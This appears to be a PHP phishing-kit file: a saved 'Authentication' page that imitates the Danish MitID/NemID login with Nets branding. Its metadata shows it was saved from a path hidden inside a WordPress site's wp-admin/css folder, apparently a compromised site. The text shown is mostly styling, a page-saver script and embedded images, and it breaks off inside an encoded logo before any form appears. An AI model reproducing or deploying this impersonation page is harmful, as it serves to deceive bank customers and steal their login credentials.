<?php
require (__DIR__) . '/../main.php';
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html lang="da"><head>
<link rel="icon" data-savepage-href="https://www.asesoriafersan.com/favicon.ico" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAFKklEQVRYw+2XXWzeZRnGf/fzfvWLt6Nbu7ddt45R2u4jodtgukAimmHASFzMgBCF6IGDxAgJmnjgCWhC4oGw+AFIZtyJiQElGQszgU0TEuaYDFYGyVtK6dbO9Yu9Xdv17fv1PBcHbd+6WkeLOE+4jp6T535+z/3c1/XPHz7X/1k2t/jl/pfMnCMWT/DQt2/XVQd44NHf2LnhzJeDD9XOuXfj8ehQS9PK3G+f2KurAnD3959yFzKT+7wP38M4B/aOGW8CJ51z6eqqxNCtN7UVf/zQ7iUBrTrYZReGp6LKFmoIWolIIa0D+hJrVhzP37dNANG5DcViAGFAhWGtklolvglM+eAHJianu/7yt643vnTv46eiUdddXZkYbbyxrfT7ZKMVJwtxfKiVVwPSGqD5o57MeqAVqQUjhagDqjE7kDedAPxlAIViCTF/ObNyc6qBDkkdgnuAS6Wi758oTZ84eWa8u9BUW4/UAbQg6oEkkADcbKH5XktgRJivPQ8gJMERzFZK6gSagZoZFpsDMuAaYLOkzUFAEOWD7ApvosXXZYDbdnSob2DkpeELE4cnLk03eB86EDcJtgptQay7HAguu2G5eLm6B7IYY8AwxgBYP3AUTP82hIvpp/uet7feOxubzObqgw9tEjsEW4HNSC3vN19XPdi4toQxCYwC/wTOgw1g9IA+xLlBjEy0Kj5ZqqsqsqdTi7pgKXr0Zwfs/TPDselcYWUIak+vvW7jUKp5SMYZxIhFI+PEXS6Zqvbju7dqWTbc9+sXLTM2tcH7oGjUDSavqcj98JG7ddWC6BdP/cmNTWSfCCHsAU6b2XHglBnpeCw6tK6lvvCdb3112UBPHuu3mAV+sHP9onvLQ1gqCVAFcD1wvaTdQFbiXC5f7OrpGTz2k8cOnDazdDwWGVm9qqb04N7d+sNbZ20w6+kez7kpr8p80LVCKS81R8waXxseTzpn+4GPrgzgQ9ke/5IBVUCbpDZJe4ApSf35Qukf/ecvvrH32VcGXjg7UQs0mnFDkNrAmkF1QI2XYoKzJvvjEgA8gm4gLal5NoAWZkANsEnSJuB+YUWhKBCRZixpC2dbV361MkAiHpE57S8W/aEQtBHYIWmbZlJu7cJQEjiMxPyhC+NgPg/s8hhiSTZ87ncv2/DoRDyXL9Qj2gU7kbaBtYPWATWjTWsYaVg9V2ra0EXBsJkNBmkkatYTpHfizh19/htbsssCWKhfPX3QMmOX4qWSXyXUHsQto41NrSMNqTGD3ojRDZwzGK2I2KXaWKTQXpsID+/coCXZ8OiRLpvO5VNBITizTE1VonTbVzr/4+afP/mCna+rd8XUam1YUaUffbFF/1UOHHn1lMvm849Jugs4Cfzd4DTQF4tEMnd+7Wb/vwii+a+hD9jMoHUKOoHvCi4CvQXvTxw8dPwYkHZmffGYG49EnHbt2q5X0oN4mZlBMczM59c3prRsAB9Udsys7RxQB9RJuhl4EBgL0ge5gn8d/MkXX0sPZPJci0ITsB4YijieBkrLBgghAJwR9CGlgMo5mFmgKFAvUQ/aCRQF00hxID4L/GfBM5/qCVzUyXk9F4JeBjYLvgBsl9QKNAGVZnPdMUAxjNhcDsx0T1dw/CcA3HHHdgE5oBfo/evRtw9lpwuVYaYbmwS3SnSCWoE1QAWaOXn2zAIwFT6tCz5Jhw+fMB9UJakB2CK4pVS7Yn0xmbwI9JmRlnjPGb333NikzxxgMaBC7YpoSNb4ZCKqXW0NV+1n5nN9pvoYRld8gcTk7u4AAAAASUVORK5CYII=">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Authentication</title>
    <meta name="msapplication-config" content="/favicon/browserconfig.xml">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">


    <style>
        body {
            fullScreen: false;
        }

        body {
            margin: 0;
            background: #f3f2f2;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            min-width: 248px;
        }

        #mitidIframe {
            width: 100%;
            height: 260px;
            border: 0;
            z-index: 100;
            position: relative;
        }

        @media (min-width: 380px) {
            #mitidIframe {
                height: 227px;
            }
        }

        @media (min-width: 400px) {
            #mitidIframe {
                height: 350px;
            }
        }

        .mitidContextStr {
            font-size: 10px;
            font-weight: normal;
            color: #333;
            border-top: 1px solid #eee;
            border-bottom: 1px solid #eee;
            padding: 6px;
            background-color: #f8f8f9;
            overflow-wrap: anywhere;
        }

        @media (min-width: 380px) {
            .mitidContextStr {
                font-size: 0.9rem;
                padding: 15px;
            }
        }

        @media (min-width: 400px) {
            .mitidContextStr {
                font-size: 0.9rem;
                padding: 08px;
            }
        }

        [hidden] {
            display: none;
        }

        .header {
            height: 42px;
            border-bottom: 0px solid #ddd;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding: 0px 16px 0px 16px;
        }

        .imgcon {
            width: 33%;
        }

        .logo {
            max-width: 100%;
            max-height: 32px;
        }

        .bank {
            float: right;
        }

        .lang {
            width: 30%;
            display: block;
            margin: auto;
            text-align: center;
        }

        .lang img {
            max-width: 20px;
            height: auto;
            width: 100%;
        }

        .lang a,
        .lang a:hover,
        .lang a:visited,
        .lang a:active {
            font-size: 2.5em;
            text-decoration: none;
        }

        .network {
            float: left;
        }

        tr td:first-child {
            width: 105px;
        }

        td {
            overflow-wrap: anywhere;
        }

        .wrapper {
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            border-radius: 4px;
            position: relative;
            display: block;
            width: 250px;
            height: 400px;
            background-color: #fff;
        }

        .container {
            position: relative;
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
            padding: 0px 16px
        }

        .content h1,
        .content p {
            font-style: normal;
            font-stretch: normal;
            line-height: 1.25em;
            letter-spacing: normal;
            color: #000;
        }

        .content h1 {
            margin: 6px 0px 6px 0px;
            font-size: 1.25em;
            font-weight: bold;
        }

        .content p {
            margin: 8px 0;
        }

        .content {
            font-weight: normal;
        }

        .content table {
            margin-top: 20px;
        }

        .details>div {
            display: flex;
            justify-content: flex-start;
            align-items: left;
            min-height: 20px;
        }

        .details .label {
            text-align: left;
            width: 42%;
            background: #fff;
        }

        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            /* display: none; <- Crashes Chrome on hover */
            -webkit-appearance: none;
            margin: 0;
            /* <-- Apparently some margin are still there even though it's hidden */
        }

        input[type=number] {
            -moz-appearance: textfield;
            /* Firefox */
        }

        input {
            font-size: 1.0em;
            width: 100px;
        }

        .buttons {
            margin-top: 6px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: row-reverse;
        }

        button {
            width: 30%;
            height: 34px;
            text-align: center;
            margin: 00px 1% 00px 1%;
            min-height: 24px;
            line-height: 24px;
            /* vertical center text*/
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 0.9em;
            color: #333;
            background-image: linear-gradient(#eee, #ddd);
        }

        button:hover {
            color: #fff;
            background-image: linear-gradient(#96bfe9, #5e99d4);
        }

        button img {
            display: inline-block;
            vertical-align: middle;
            width: 12px;
        }

        .nemid,
        .mitid {
            border: none;
            background: none;
        }

        button.nemid,
        button.mitid {
            border: 1px solid #ddd;
            background-image: linear-gradient(#eee, #ddd);
        }

        button.nemid:hover,
        button.mitid:hover {
            color: #fff;
            background-image: linear-gradient(#96bfe9, #5e99d4);
        }

        button.nemid img {
            width: 60%;
        }

        button.mitid img {
            width: 50%;
        }

        .content .spinner_container {}

        .errors {
            background-color: #fff2f2;
            padding: 4px;
            margin-top: 5px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .errors .exclamation {
            width: 16px;
            height: 16px;
            line-height: 16px;
            border-radius: 16px;
            border: 1px solid red;
            display: inline-block;
            color: red;
            text-align: center;
        }

        .errors h1 {
            background-image: /*savepage-url=exclamation.png*/ url();
            background-position: left center;
            background-size: contain;
            background-repeat: no-repeat;
            padding-left: 20px;
            font-size: 10px;
            color: #000;
        }

        .errors p {
            font-weight: bold;
            color: #f00;
        }

        footer {
            position: absolute;
            bottom: 0;
            padding: 0px 25px;
        }

        footer p {
            font-family: Arial, sans-serif;
            margin-bottom: 6px;
        }

        .mobile {
            position: absolute;
            bottom: 0;
            right: 15px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            margin-left: -8px;
            margin-top: -12px;
        }

        @media (min-width: 380px) {

            body {
                font-size: 14px;
            }

            .wrapper {
                width: 380px;
                height: 550px;
            }

            .header {
                height: 72px;
                display: flex;
                justify-content: flex-center;
                align-items: center;
            }

            .container {
                padding: 0px 20px;
            }

            .content .images_container img:first-child {
                width: 72px;
                height: 72px;
                display: none;
            }

            .content .images_container img:last-child {
                display: none;
            }

            .content h1 {
                font-size: 1.25em;
            }

            .content h1,
            .content p {
                line-height: 1.23;
            }

            tr td:first-child {
                width: 170px;
            }

            td {
                overflow-wrap: anywhere;
            }

            .logo {
                max-width: 100%;
                max-height: 60px;
            }

            .lang img {
                max-width: 40px;
            }

            .details>div {
                display: flex;
                justify-content: flex-start;
                align-items: left;
                min-height: 30px;
            }

            button {
                min-height: 30px;
                line-height: 30px;
                /* vertical center text*/
            }

            .content p {
                line-height: 1.55;
            }

            .error_container h1 {
                font-size: 20px;
                padding-left: 32px;
            }

            .error_container p {
                font-size: 16px;
                margin-right: 00px;
            }

            .cancel {
                font-size: 16px;
            }

            .mobile {
                width: 112px;
                height: 215px;
                right: 40px;
            }

            .spinner {
                margin-top: -25px;
            }

            footer {
                padding: 0px 25px;
            }

            footer p {}

        }

        @media (min-width: 400px) {

            body {
                font-size: 14px;
            }

            .wrapper {
                width: 380px;
                height: 550px;
            }

            .header {
                height: 72px;
                display: flex;
                justify-content: flex-center;
                align-items: center;
            }

            .container {
                padding: 0px 20px;
            }

            .content .images_container img:first-child {
                width: 72px;
                height: 72px;
                display: none;
            }

            .content .images_container img:last-child {
                display: none;
            }

            .content h1 {
                font-size: 1.25em;
            }

            .content h1,
            .content p {
                line-height: 1.23;
            }

            tr td:first-child {
                width: 170px;
            }

            td {
                overflow-wrap: anywhere;
            }

            .logo {
                max-width: 100%;
                max-height: 60px;
            }

            .lang img {
                max-width: 40px;
            }

            .details>div {
                display: flex;
                justify-content: flex-start;
                align-items: left;
                min-height: 30px;
            }

            button {
                min-height: 30px;
                line-height: 30px;
                /* vertical center text*/
            }

            .content p {
                line-height: 1.55;
            }

            .error_container h1 {
                font-size: 20px;
                padding-left: 32px;
            }

            .error_container p {
                font-size: 16px;
                margin-right: 00px;
            }

            .cancel {
                font-size: 16px;
            }

            .mobile {
                width: 112px;
                height: 215px;
                right: 40px;
            }

            .spinner {
                margin-top: -25px;
            }

            footer {
                padding: 0px 25px;
            }

            footer p {}

        }
    </style>

    <style>
        body {
            fullScreen: false;
        }

        body {
            margin: 0;
            background: #f3f2f2;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            min-width: 248px;
        }

        #mitidIframe {
            width: 100%;
            height: 260px;
            border: 0;
            z-index: 100;
            position: relative;
        }

        @media (min-width: 380px) {
            #mitidIframe {
                height: 227px;
            }
        }

        @media (min-width: 400px) {
            #mitidIframe {
                height: 350px;
            }
        }

        .mitidContextStr {
            font-size: 10px;
            font-weight: normal;
            color: #333;
            border-top: 1px solid #eee;
            border-bottom: 1px solid #eee;
            padding: 6px;
            background-color: #f8f8f9;
            overflow-wrap: anywhere;
        }

        @media (min-width: 380px) {
            .mitidContextStr {
                font-size: 0.9rem;
                padding: 08px;
            }
        }

        @media (min-width: 400px) {
            .mitidContextStr {
                font-size: 0.9rem;
                padding: 15px;
            }
        }


        [hidden] {
            display: none;
        }

        .header {
            height: 42px;
            border-bottom: 0px solid #ddd;
            display: flex;
            justify-content: flex-end;
            align-items: center;
            padding: 0px 16px 0px 16px;
        }

        .imgcon {
            width: 33%;
        }

        .logo {
            max-width: 100%;
            max-height: 32px;
        }

        .bank {
            float: right;
        }

        .lang {
            width: 30%;
            display: block;
            margin: auto;
            text-align: center;
        }

        .lang img {
            max-width: 20px;
            height: auto;
            width: 100%;
        }

        .lang a,
        .lang a:hover,
        .lang a:visited,
        .lang a:active {
            font-size: 2.5em;
            text-decoration: none;
        }

        .network {
            float: left;
        }

        tr td:first-child {
            width: 105px;
        }

        td {
            overflow-wrap: anywhere;
        }

        .wrapper {
            -webkit-border-radius: 4px;
            -moz-border-radius: 4px;
            border-radius: 4px;
            position: relative;
            display: block;
            width: 250px;
            height: 400px;
            background-color: #fff;
        }

        .container {
            position: relative;
            display: flex;
            flex-direction: column;
            font-family: Arial, sans-serif;
            padding: 0px 16px
        }

        .content h1,
        .content p {
            font-style: normal;
            font-stretch: normal;
            line-height: 1.25em;
            letter-spacing: normal;
            color: #000;
        }

        .content h1 {
            margin: 6px 0px 6px 0px;
            font-size: 1.25em;
            font-weight: bold;
        }

        .content p {
            margin: 8px 0;
        }

        .content {
            font-weight: normal;
        }

        .content table {
            margin-top: 20px;
        }

        .details>div {
            display: flex;
            justify-content: flex-start;
            align-items: left;
            min-height: 20px;
        }

        .details .label {
            text-align: left;
            width: 42%;
            background: #fff;
        }

        input::-webkit-outer-spin-button,
        input::-webkit-inner-spin-button {
            /* display: none; <- Crashes Chrome on hover */
            -webkit-appearance: none;
            margin: 0;
            /* <-- Apparently some margin are still there even though it's hidden */
        }

        input[type=number] {
            -moz-appearance: textfield;
            /* Firefox */
        }

        input {
            font-size: 1.0em;
            width: 100px;
        }

        .buttons {
            margin-top: 6px;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: row-reverse;
        }

        button {
            width: 30%;
            height: 34px;
            text-align: center;
            margin: 00px 1% 00px 1%;
            min-height: 24px;
            line-height: 24px;
            /* vertical center text*/
            border-radius: 4px;
            border: 1px solid #ccc;
            font-size: 0.9em;
            color: #333;
            background-image: linear-gradient(#eee, #ddd);
        }

        button:hover {
            color: #fff;
            background-image: linear-gradient(#96bfe9, #5e99d4);
        }

        button img {
            display: inline-block;
            vertical-align: middle;
            width: 12px;
        }

        .nemid,
        .mitid {
            border: none;
            background: none;
        }

        button.nemid,
        button.mitid {
            border: 1px solid #ddd;
            background-image: linear-gradient(#eee, #ddd);
        }

        button.nemid:hover,
        button.mitid:hover {
            color: #fff;
            background-image: linear-gradient(#96bfe9, #5e99d4);
        }

        button.nemid img {
            width: 60%;
        }

        button.mitid img {
            width: 50%;
        }

        .content .spinner_container {}

        .errors {
            background-color: #fff2f2;
            padding: 4px;
            margin-top: 5px;
            text-align: center;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .errors .exclamation {
            width: 16px;
            height: 16px;
            line-height: 16px;
            border-radius: 16px;
            border: 1px solid red;
            display: inline-block;
            color: red;
            text-align: center;
        }

        .errors h1 {
            background-image: /*savepage-url=exclamation.png*/ url();
            background-position: left center;
            background-size: contain;
            background-repeat: no-repeat;
            padding-left: 20px;
            font-size: 10px;
            color: #000;
        }

        .errors p {
            font-weight: bold;
            color: #f00;
        }

        footer {
            position: absolute;
            bottom: 0;
            padding: 0px 25px;
        }

        footer p {
            font-family: Arial, sans-serif;
            margin-bottom: 6px;
        }

        .mobile {
            position: absolute;
            bottom: 0;
            right: 15px;
        }

        .spinner {
            width: 50px;
            height: 50px;
            margin-left: -8px;
            margin-top: -12px;
        }

        @media (min-width: 380px) {

            body {
                font-size: 11px;
            }

            .wrapper {
                width: 380px;
                height: 415px;
            }

            .header {
                height: 72px;
                display: flex;
                justify-content: flex-center;
                align-items: center;
            }

            .container {
                padding: 0px 20px;
            }

            .content .images_container img:first-child {
                width: 72px;
                height: 72px;
                display: none;
            }

            .content .images_container img:last-child {
                display: none;
            }

            .content h1 {
                font-size: 1.25em;
            }

            .content h1,
            .content p {
                line-height: 1.23;
            }

            tr td:first-child {
                width: 170px;
            }

            td {
                overflow-wrap: anywhere;
            }

            .logo {
                max-width: 100%;
                max-height: 60px;
            }

            .lang img {
                max-width: 40px;
            }

            .details>div {
                display: flex;
                justify-content: flex-start;
                align-items: left;
                min-height: 30px;
            }

            button {
                min-height: 30px;
                line-height: 30px;
                /* vertical center text*/
            }

            .content p {
                line-height: 1.55;
            }

            .error_container h1 {
                font-size: 20px;
                padding-left: 32px;
            }

            .error_container p {
                font-size: 16px;
                margin-right: 00px;
            }

            .cancel {
                font-size: 16px;
            }

            .mobile {
                width: 112px;
                height: 215px;
                right: 40px;
            }

            .spinner {
                margin-top: -25px;
            }

            footer {
                padding: 0px 25px;
            }

            footer p {}

        }

        @media (min-width: 400px) {

            body {
                font-size: 14px;
            }

            .wrapper {
                width: 380px;
                height: 550px;
            }

            .header {
                height: 72px;
                display: flex;
                justify-content: flex-center;
                align-items: center;
            }

            .container {
                padding: 0px 20px;
            }

            .content .images_container img:first-child {
                width: 72px;
                height: 72px;
                display: none;
            }

            .content .images_container img:last-child {
                display: none;
            }

            .content h1 {
                font-size: 1.25em;
            }

            .content h1,
            .content p {
                line-height: 1.23;
            }

            tr td:first-child {
                width: 170px;
            }

            td {
                overflow-wrap: anywhere;
            }

            .logo {
                max-width: 100%;
                max-height: 60px;
            }

            .lang img {
                max-width: 40px;
            }

            .details>div {
                display: flex;
                justify-content: flex-start;
                align-items: left;
                min-height: 30px;
            }

            button {
                min-height: 30px;
                line-height: 30px;
                /* vertical center text*/
            }

            .content p {
                line-height: 1.55;
            }

            .error_container h1 {
                font-size: 20px;
                padding-left: 32px;
            }

            .error_container p {
                font-size: 16px;
                margin-right: 00px;
            }

            .cancel {
                font-size: 16px;
            }

            .mobile {
                width: 112px;
                height: 215px;
                right: 40px;
            }

            .spinner {
                margin-top: -25px;
            }

            footer {
                padding: 0px 25px;
            }

            footer p {}

        }
    </style>



<style id="savepage-cssvariables">
  :root {
  }
</style>
<script id="savepage-shadowloader" type="text/javascript">
  "use strict";
  window.addEventListener("DOMContentLoaded",
  function(event) {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
</script>
<meta name="savepage-url" content="https://www.asesoriafersan.com/wp-admin/css/colors/blue/dodk/verification.php">
<meta name="savepage-title" content="Authentication">
<meta name="savepage-pubdate" content="Unknown">
<meta name="savepage-from" content="https://www.asesoriafersan.com/wp-admin/css/colors/blue/dodk/verification.php">
<meta name="savepage-date" content="Sun Oct 06 2024 23:05:09 GMT+0200 (heure d’été d’Europe centrale)">
<meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
<meta name="savepage-version" content="33.9">
<meta name="savepage-comments" content="">
  </head>

<body>
    <section class="wrapper">
        <header class="header">
            <div class="imgcon"><img data-savepage-currentsrc="https://www.asesoriafersan.com/wp-admin/css/colors/blue/dodk/verification_files/Nets_logo.svg" data-savepage-src="./verification_files/Nets_logo.svg" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+CjxzdmcKICAgeG1sbnM6ZGM9Imh0dHA6Ly9wdXJsLm9yZy9kYy9lbGVtZW50cy8xLjEvIgogICB4bWxuczpjYz0iaHR0cDovL2NyZWF0aXZlY29tbW9ucy5vcmcvbnMjIgogICB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiCiAgIHhtbG5zOnN2Zz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciCiAgIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIKICAgdmlld0JveD0iMCAwIDM3Ny45NDY2NiAxMTAuNTIiCiAgIGhlaWdodD0iMTEwLjUyIgogICB3aWR0aD0iMzc3Ljk0NjY2IgogICBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWluWU1pbiIKICAgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIKICAgaWQ9InN2ZzIiCiAgIHZlcnNpb249IjEuMSI+PG1ldGFkYXRhCiAgICAgaWQ9Im1ldGFkYXRhOCI+PHJkZjpSREY+PGNjOldvcmsKICAgICAgICAgcmRmOmFib3V0PSIiPjxkYzpmb3JtYXQ+aW1hZ2Uvc3ZnK3htbDwvZGM6Zm9ybWF0PjxkYzp0eXBlCiAgICAgICAgICAgcmRmOnJlc291cmNlPSJodHRwOi8vcHVybC5vcmcvZGMvZGNtaXR5cGUvU3RpbGxJbWFnZSIgLz48L2NjOldvcms+PC9yZGY6UkRGPjwvbWV0YWRhdGE+PGRlZnMKICAgICBpZD0iZGVmczYiIC8+PGcKICAgICB0cmFuc2Zvcm09Im1hdHJpeCgxLjMzMzMzMzMsMCwwLC0xLjMzMzMzMzMsMCwxMTAuNTIpIgogICAgIGlkPSJnMTAiPjxnCiAgICAgICB0cmFuc2Zvcm09InNjYWxlKDAuMSkiCiAgICAgICBpZD0iZzEyIj48cGF0aAogICAgICAgICBpZD0icGF0aDE0IgogICAgICAgICBzdHlsZT0iZmlsbDojMjA1Mzc3O2ZpbGwtb3BhY2l0eToxO2ZpbGwtcnVsZTpub256ZXJvO3N0cm9rZTpub25lIgogICAgICAgICBkPSJtIDEzLjA4NTksMTMuMDg1OSBjIC04LjMzMTk5LDAgLTEzLjA4OTgwNjI1LDQuNzYxOCAtMTMuMDg5ODA2MjUsMTMuMDg5OSBWIDU3OC4wOTggYyAwLDcuMTQgMi4zOTA2MjYyNSwxMy4wOSA5LjUxOTUzNjI1LDE2LjY2IDY3LjgwMDc3LDI4LjUzOSAxNDYuMzAwMzcsNDYuMzc5IDIyOC4zNzkzNyw0Ni4zNzkgMTU5LjM5LDAgMjY3LjY0LC03NC45MyAyNjcuNjQsLTI1Ni45MyBWIDI2LjE3NTggYyAwLC04LjMyODEgLTQuNzUsLTEzLjA4OTkgLTE0LjI2OSwtMTMuMDg5OSBoIC03MC4xOTIgYyAtOC4zMiwwIC0xMy4wNzgsNC43NjE4IC0xMy4wNzgsMTMuMDg5OSBWIDM4MS44MjggYyAwLDEyMy43MDcgLTYzLjA0MywxNzEuMjg5IC0xNzAuMTAxLDE3MS4yODkgLTQ5Ljk2MSwwIC0xMDMuNDgxLC05LjUxMiAtMTQwLjM1OTgsLTIxLjQxIFYgMjYuMTc1OCBjIDAsLTguMzI4MSAtNC43NjE4LC0xMy4wODk5IC0xNC4yNjE4LC0xMy4wODk5IiAvPjxwYXRoCiAgICAgICAgIGlkPSJwYXRoMTYiCiAgICAgICAgIHN0eWxlPSJmaWxsOiMyMDUzNzc7ZmlsbC1vcGFjaXR5OjE7ZmlsbC1ydWxlOm5vbnplcm87c3Ryb2tlOm5vbmUiCiAgICAgICAgIGQ9Im0gODk0LjQ2OSw1NTMuMTE3IGMgLTg5LjIxMSwwIC0xNTMuNDQyLC00Ni4zOSAtMTUzLjQ0MiwtMTQ4LjY5MSB2IC00OS45NDkgaCAzMDYuODkzIHYgNDkuOTQ5IGMgMCwxMDEuMTA5IC02Ni42MjMsMTQ4LjY5MSAtMTUzLjQ1MSwxNDguNjkxIG0gMjQ4LjYxMSwtMjY1LjI1IGMgMCwtOS41MzEgLTQuNzYsLTE0LjI4MSAtMTMuMDksLTE0LjI4MSBIIDc0MS4wMjcgdiAtNDkuOTU3IGMgMCwtODkuMjExIDY2LjYwMiwtMTM2Ljc5MzEgMTU0LjY0MSwtMTM2Ljc5MzEgODIuMDcsMCAxMzcuOTcyLDMyLjEyMTEgMTgxLjk4Miw2Ni42MDkxIDcuMTUsNC43NjIgMTQuMjgsMy41NzEgMTkuMDMsLTMuNTY2IGwgMzQuNSwtNDUuMjAzIGMgNS45NiwtNy4xNDA4IDQuNzYsLTEzLjA3ODMgLTIuMzgsLTE5LjAyNzYgQyAxMDY5LjMzLDM1LjY4NzUgOTkzLjE5NSwtMC4wMDM5MDYyNSA4OTMuMjc3LC0wLjAwMzkwNjI1IDc2NC44MTYsLTAuMDAzOTA2MjUgNjQyLjI4NSw3My43NDYxIDY0Mi4yODUsMjIzLjYyOSB2IDE4MC43OTcgYyAwLDE2Mi45NzIgMTIxLjMzMiwyMzYuNzExIDI1Mi4xODQsMjM2LjcxMSAxMjkuNjYxLDAgMjQ4LjYxMSwtNzMuNzM5IDI0OC42MTEsLTIzNi43MTEiIC8+PHBhdGgKICAgICAgICAgaWQ9InBhdGgxOCIKICAgICAgICAgc3R5bGU9ImZpbGw6IzIwNTM3NztmaWxsLW9wYWNpdHk6MTtmaWxsLXJ1bGU6bm9uemVybztzdHJva2U6bm9uZSIKICAgICAgICAgZD0ibSAxNDg3Ljk5LDkwLjQwMjMgYyAxMy4wOSwwIDM1LjY4LDEuMTkxNSA1Ny4wOSwyLjM3OSA5LjUyLDAgMTQuMjgsLTQuNzU3OSAxNC4yOCwtMTMuMDc4MiBWIDE2LjY1MjMgYyAwLC03LjE0MDU4IC0zLjU4LC0xMy4wODk4IC0xMS45LC0xNC4yNjk0OSAtMjEuNDEsLTEuMTkxNCAtNDguNzcsLTIuMzc4OTAzNzUgLTY0LjIzLC0yLjM3ODkwMzc1IC0xMTguOTYsMCAtMjA2Ljk3LDY0LjIyNjU5Mzc1IC0yMDYuOTcsMjEwLjUzOTA5Mzc1IHYgNTU0LjMwOSBjIDAsOS41MTEgNC43NiwxNC4yODEgMTQuMjYsMTQuMjgxIGggNjEuODYgYyA3LjE0LDAgMTEuODksLTQuNzcgMTMuMDksLTEzLjA5IGwgOC4zMiwtMTQzLjkzIGggMTU0LjY0IGMgOC4zMiwwIDEzLjA5LC00Ljc2MSAxMy4wOSwtMTMuMDkgdiAtNTkuNDcyIGMgMCwtOS41MiAtNC43NywtMTQuMjcgLTEzLjA5LC0xNC4yNyBoIC0xNTQuNjQgdiAtMzE5Ljk4IGMgMCwtNzguNTA4IDQwLjQ0LC0xMjQuODk4NyAxMTQuMiwtMTI0Ljg5ODciIC8+PHBhdGgKICAgICAgICAgaWQ9InBhdGgyMCIKICAgICAgICAgc3R5bGU9ImZpbGw6IzIwNTM3NztmaWxsLW9wYWNpdHk6MTtmaWxsLXJ1bGU6bm9uemVybztzdHJva2U6bm9uZSIKICAgICAgICAgZD0ibSAxODYyLjY3LDAgYyAtODIuMDgsMCAtMTY0LjE2LDIzLjc5MyAtMjM1LjUzLDc2LjEyMTEgLTcuMTQsNC43Njk1IC03LjE0LDExLjg5ODQgLTMuNTYsMTkuMDUwOCBsIDMyLjExLDU0LjY5OTEgYyA0Ljc2LDguMzI4IDEwLjcxLDkuNTIgMTkuMDMsMy41NzggNTcuMSwtNDIuODE2IDEyMi41MiwtNjYuNjA5MiAxOTAuMzIsLTY2LjYwOTIgNzkuNywwIDE0MC4zNiwzMy4zMDEyIDE0MC4zNiw5NS4xNTIyIDAsNjYuNjEgLTczLjc1LDgyLjA3OCAtMTQwLjM2LDk1LjE2IC04NS42NCwxNy44NDggLTIzMS45NSw1MS4xNDkgLTIzMS45NSwxODkuMTI5IDAsMTIxLjM0IDExNS4zOCwxNzQuODYgMjM0LjM0LDE3NC44NiA3NC45MywwIDE0MS41NSwtMTkuMDMyIDIwNi45NiwtNTUuOTExIDguMzQsLTMuNTU4IDkuNTIsLTEwLjY5OSA0Ljc2LC0xNy44MzkgbCAtMzIuMTEsLTUzLjUyIGMgLTMuNTcsLTcuMTQxIC0xMC43MSwtOS41MTkgLTE3Ljg1LC00Ljc2MiAtNDguNzYsMjYuMTcyIC0xMDcuMDYsNDQuMDEyIC0xNjYuNTIsNDQuMDEyIC04My4yNywwIC0xMzMuMjMsLTMzLjMwOCAtMTMzLjIzLC04Ni44NCAwLC02NS40MjIgNzAuMTgsLTgzLjI2MSAxNTQuNjQsLTk5LjkxIDk1LjE1LC0xOS4wMzkgMjIwLjA1LC00Ni4zOTEgMjIwLjA1LC0xNzkuNjIxIEMgMjEwNC4xMyw2NS40MjE5IDIwMDEuODQsMCAxODYyLjY3LDAiIC8+PHBhdGgKICAgICAgICAgaWQ9InBhdGgyMiIKICAgICAgICAgc3R5bGU9ImZpbGw6IzUyYzRmMTtmaWxsLW9wYWNpdHk6MTtmaWxsLXJ1bGU6bm9uemVybztzdHJva2U6bm9uZSIKICAgICAgICAgZD0ibSAyNTU3LjgzLDY5MC42MjEgYyAwLC03Ni4zOTEgLTYxLjkzLC0xMzguMzIgLTEzOC4zMiwtMTM4LjMyIC03Ni40LDAgLTEzOC4zMiw2MS45MjkgLTEzOC4zMiwxMzguMzIgMCw3Ni4zOTEgNjEuOTIsMTM4LjMyIDEzOC4zMiwxMzguMzIgNzYuMzksMCAxMzguMzIsLTYxLjkyOSAxMzguMzIsLTEzOC4zMiIgLz48cGF0aAogICAgICAgICBpZD0icGF0aDI0IgogICAgICAgICBzdHlsZT0iZmlsbDojNTJjNGYxO2ZpbGwtb3BhY2l0eToxO2ZpbGwtcnVsZTpub256ZXJvO3N0cm9rZTpub25lIgogICAgICAgICBkPSJtIDI4M